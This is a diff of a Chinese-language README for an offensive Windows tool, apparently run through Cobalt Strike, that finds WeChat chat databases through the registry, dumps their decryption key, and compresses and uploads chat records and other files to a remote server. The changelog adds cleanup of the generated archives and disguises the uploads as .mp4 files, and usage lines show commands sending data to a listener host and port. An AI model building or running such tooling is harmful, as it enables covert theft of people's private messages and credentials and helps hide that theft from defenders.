@@ -1,36 +1,34 @@
 # FileSearch
 
-## 更新
+## 开发中......
 ### v1.3
 
-1、排除c盘符的查找指定类型文件，避免大量缓存文件，加了个参数在c:\\users目录下查找
+1、排除c盘符的查找指定类型文件，避免大量缓存文件，自定义参数在c:\\users目录下查找
 
-2、运行成功后删除掉生成出来的文件夹以及压缩包，文件后缀修改成了mp4
+2、运行成功后删除生成出来的文件夹以及压缩包，文件后缀随机修改成了mp4
 
-3、(碰到vx用户自设的保存路径，需要加个指定路径去dump)
+3、(碰到vx用户自设的保存路径，需要加个指定路径去获取)
+
+4、优化了查找文件匹配方式，支持模糊匹配或精确匹配
 
 ![](https://images.zsxq.com/Fr7-9bEGX922u_WCD00vgKzoQkvE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1672502399&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:g2IPF0-87rABGDbCjicVM8bm79g=)
 
 ```
 [+] FileUpload.exe dumpkey
+[+] FileUpload.exe search d:\ .docx 
 [+] FileUpload.exe send 127.0.0.1 8888
 [+] FileUpload.exe send 127.0.0.1 8888 vxpath
 [+] FileUpload.exe upload path 127.0.0.1 8888
 [+] FileUpload.exe all 127.0.0.1 8888
 [+] FileUpload.exe user 127.0.0.1 8888
+
 ```
 
-
-
 ### v1.2(暂不开源)
-实现效果：
-![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665471090145-08f5b557-680f-4c8c-8fce-9574d581f81d.png)
 
-
-实战中发现全盘查找微信db在c2中非常拉跨，查找等待时间较长，且盘符越多越慢
+实战中发现全盘查找微信数据库文件在cs中非常拉跨，查找等待时间较长，且盘符越多越慢
 
 1、直接读取注册表的键值，wxid关键字匹配拼接路径
-
 
 ```
 void getPath(char *dbpath)
@@ -95,14 +93,17 @@ void getFileNames(string path, vector<string>& files)
 [+] FileUpload.exe dumpkey
 [+] FileUpload.exe send 127.0.0.1 8888
 [+] FileUpload.exe upload path 127.0.0.1 8888
+
 ```
+实现效果：
+![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665471090145-08f5b557-680f-4c8c-8fce-9574d581f81d.png)
 
 ### v1.1
 服务端：python2 http_put.py 80 path 
 
 （win10自带curl.exe，其他系统可以上传一个或者引用socket库）
 
-1、新增全盘查找微信聊天记录db文件并压缩上传到指定服务器
+1、新增全盘查找微信聊天记录文件并压缩上传到指定服务器
 
 2、压缩本地文件并上传到指定服务器
 
